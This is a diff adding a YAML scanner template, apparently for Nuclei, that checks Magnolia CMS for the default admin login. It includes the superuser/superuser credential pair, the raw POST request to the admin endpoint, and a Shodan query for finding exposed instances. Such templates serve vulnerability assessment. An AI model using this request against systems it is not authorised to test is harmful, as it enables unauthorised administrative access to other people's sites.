@@ -1,0 +1,36 @@
+id: magnolia-default-login
+
+info:
+  name: Magnolia Default Login
+  author: rix4uni
+  severity: high
+  description: Mangnolia CMS default credentials were discovered.
+  reference:
+    - https://www.magnolia-cms.com/
+  metadata:
+    verified: "true"
+    shodan-query: http.favicon.hash:1545970007
+  tags: magnolia,default-login
+
+requests:
+  - raw:
+      - |-
+        POST /.magnolia/admincentral HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: csrf=EHClGj73RtsNpTPVZpEuBCDA6Hfe9vp4oNixaBiH6EM:AAABhyiNTeY:_Jltxp_qfPr-nD6Sg62gCw
+
+        mgnlUserId={{username}}&mgnlUserPSWD={{password}}&csrf=EHClGj73RtsNpTPVZpEuBCDA6Hfe9vp4oNixaBiH6EM:AAABhyiNTeY:_Jltxp_qfPr-nD6Sg62gCw
+
+    attack: pitchfork
+    payloads:
+      username:
+        - superuser
+      password:
+        - superuser
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
